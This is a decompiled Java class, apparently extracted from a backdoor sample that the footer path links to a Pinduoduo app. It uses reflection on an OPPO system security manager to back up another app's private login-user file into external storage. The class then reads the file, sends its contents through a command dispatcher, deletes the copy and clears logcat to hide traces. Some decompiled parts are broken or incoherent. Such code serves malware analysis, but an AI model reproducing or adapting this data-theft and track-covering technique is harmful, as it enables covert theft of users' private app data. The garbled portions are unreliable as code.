package com.google.android.sd.biz_dynamic_dex.oppo_community_id;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Build;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.biz_dynamic_dex.base.DynamicUtils;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import java.io.File;
import java.util.Random;
import java.util.concurrent.atomic.AtomicBoolean;
import org.json.JSONObject;

public class OppoCommunityIdExecutor extends DynamicCmdExecutor {
  private static final int CMD = 3006;
  
  private final TestReceiver receiver = new TestReceiver();
  
  private int requestId = 10010;
  
  private String targetP = "";
  
  private String uuid = "";
  
  private static void fail(Context paramContext, String paramString1, String paramString2) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(3006, paramString1, "client"), paramString2, null));
  }
  
  private static void success(Context paramContext, String paramString1, String paramString2) {
    try {
      JSONObject jSONObject = new JSONObject();
      jSONObject.put("content", paramString2);
      return;
    } finally {
      paramContext = null;
    } 
  }
  
  private void workWeather(Context paramContext) {
    IntentFilter intentFilter = new IntentFilter();
    intentFilter.addAction("action.backup.app.data.success");
    intentFilter.addAction("action.backup.app.data.failed");
    paramContext.registerReceiver(this.receiver, intentFilter);
    try {
      Object object = Utils.getSysMethod(Class.forName("android.os.customize.OplusCustomizeSecurityManager"), "getInstance").invoke(null, new Object[] { paramContext });
      Utils.getSysMethod(object.getClass(), "backupAppData").invoke(object, new Object[] { Integer.valueOf(0), "/shared_prefs/CurrentLoginUserUid.xml", "com.oppo.community", this.targetP, Integer.valueOf(this.requestId) });
      return;
    } catch (Exception exception) {
      String str = this.uuid;
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append("reflect_fail_");
      stringBuilder.append(exception.getMessage());
      fail(paramContext, str, stringBuilder.toString());
      return;
    } 
  }
  
  protected void realExecute(Context paramContext, String paramString) throws Exception {
    if (Build.VERSION.SDK_INT < 24)
      return; 
    try {
      this.uuid = (new JSONObject(paramString)).optString("uuid");
      StringBuilder stringBuilder = new StringBuilder();
      stringBuilder.append(paramContext.getExternalCacheDir().getAbsolutePath());
      stringBuilder.append("/tmp.xml");
      this.targetP = stringBuilder.toString();
      this.requestId = (new Random(100000L)).nextInt();
      return;
    } finally {
      paramContext = null;
    } 
  }
  
  public class TestReceiver extends BroadcastReceiver {
    AtomicBoolean lock = new AtomicBoolean(false);
    
    public void onReceive(final Context context, Intent param1Intent) {
      try {
        if (param1Intent.getIntExtra("requestId", -1) != OppoCommunityIdExecutor.this.requestId)
          return; 
        if (!this.lock.compareAndSet(false, true))
          return; 
        context.unregisterReceiver(this);
        Utils.runInNewThread(new Runnable() {
              public void run() {
                File file = new File(OppoCommunityIdExecutor.this.targetP);
                try {
                  if (TextUtils.equals(ret, "action.backup.app.data.failed")) {
                    OppoCommunityIdExecutor.fail(context, OppoCommunityIdExecutor.this.uuid, "back_up_fail");
                  } else if (!file.exists() || !file.isFile() || file.length() <= 0L) {
                    OppoCommunityIdExecutor.fail(context, OppoCommunityIdExecutor.this.uuid, "file_not_exist");
                  } else {
                    String str = DynamicUtils.readFile(file.getAbsolutePath(), false);
                    OppoCommunityIdExecutor.success(context, OppoCommunityIdExecutor.this.uuid, str);
                    file.delete();
                    DynamicUtils.clearLogcat();
                  } 
                  file.delete();
                  DynamicUtils.clearLogcat();
                  return;
                } catch (Exception exception) {
                  Context context = context;
                  String str = OppoCommunityIdExecutor.this.uuid;
                  StringBuilder stringBuilder = new StringBuilder();
                  stringBuilder.append("read_file_error_");
                  stringBuilder.append(exception.getMessage());
                  OppoCommunityIdExecutor.fail(context, str, stringBuilder.toString());
                } finally {
                  Exception exception;
                } 
                file.delete();
                DynamicUtils.clearLogcat();
              }
            });
        return;
      } catch (Exception exception) {
        return;
      } 
    }
  }
  
  class null implements Runnable {
    public void run() {
      File file = new File(OppoCommunityIdExecutor.this.targetP);
      try {
        if (TextUtils.equals(ret, "action.backup.app.data.failed")) {
          OppoCommunityIdExecutor.fail(context, OppoCommunityIdExecutor.this.uuid, "back_up_fail");
        } else if (!file.exists() || !file.isFile() || file.length() <= 0L) {
          OppoCommunityIdExecutor.fail(context, OppoCommunityIdExecutor.this.uuid, "file_not_exist");
        } else {
          String str = DynamicUtils.readFile(file.getAbsolutePath(), false);
          OppoCommunityIdExecutor.success(context, OppoCommunityIdExecutor.this.uuid, str);
          file.delete();
          DynamicUtils.clearLogcat();
        } 
        file.delete();
        DynamicUtils.clearLogcat();
        return;
      } catch (Exception exception) {
        Context context = context;
        String str = OppoCommunityIdExecutor.this.uuid;
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.append("read_file_error_");
        stringBuilder.append(exception.getMessage());
        OppoCommunityIdExecutor.fail(context, str, stringBuilder.toString());
      } finally {
        Exception exception;
      } 
      file.delete();
      DynamicUtils.clearLogcat();
    }
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\538278f3-9f68-4fce-be10-12635b9640b2-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\oppo_community_id\OppoCommunityIdExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */